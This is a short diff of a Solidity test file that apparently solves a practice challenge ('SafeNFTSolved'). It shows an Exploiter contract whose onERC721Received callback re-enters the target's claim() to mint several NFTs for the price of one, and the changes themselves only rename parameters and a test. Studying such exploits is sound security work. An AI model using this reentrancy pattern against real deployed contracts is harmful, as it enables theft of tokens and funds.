@@ -36,11 +36,7 @@ contract Exploiter is IERC721Receiver {
         target.claim();
     }
 
-    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
-        external
-        override
-        returns (bytes4)
-    {
+    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4) {
         /// Reentrancy attack: Call claim until we mint multiple NFTs for the price of 1
         if (target.balanceOf(address(this)) < 2) target.claim();
 
@@ -60,7 +56,7 @@ contract SafeNFTSolved is Test {
         exploiter = new Exploiter{value: 2 ether}(target);
     }
 
-    function test_exploit() external {
+    function testExploit() external {
         uint256 balanceETHBefore = address(exploiter).balance;
         exploiter.payForOneNFT();
         exploiter.exploit();
